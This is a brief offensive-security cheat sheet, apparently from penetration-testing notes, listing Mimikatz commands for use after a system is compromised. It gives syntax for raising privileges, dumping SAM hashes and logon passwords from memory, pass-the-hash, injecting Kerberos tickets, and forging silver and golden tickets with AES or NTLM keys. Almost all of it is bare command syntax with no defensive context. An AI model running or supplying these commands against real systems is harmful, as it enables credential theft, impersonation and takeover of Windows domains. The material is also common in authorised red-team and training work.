# Mimikatz

## Mimikatz

Post exploitation commands must be executed from SYSTEM level privileges.

* mimikatz \# privilege::debug
* mimikatz \# token::whoami
* mimikatz \# token::elevate
* mimikatz \# lsadump::sam
* mimikatz \# sekurlsa::logonpasswords

### Pass The Hash

* mimikatz \# sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm\_hash

### Inject generated TGS key

* mimikatz \# kerberos::ptt 

### Generating a Silver Ticket

AES 256 Key:

* mimikatz \# kerberos::golden /domain:/sid: /aes256: /user: /service: /target:

AES 128 Key:

* mimikatz \# kerberos::golden /domain:/sid: /aes128: /user: /service: /target:

NTLM:

* mimikatz \# kerberos::golden /domain:/sid: /rc4: /user: /service: /target:

### Generating a Golden Ticket

AES 256 Key:

* mimikatz \# kerberos::golden /domain:/sid: /aes256: /user:

AES 128 Key:

* mimikatz \# kerberos::golden /domain:/sid: /aes128: /user:

NTLM:

* mimikatz \# kerberos::golden /domain:/sid: /rc4: /user:

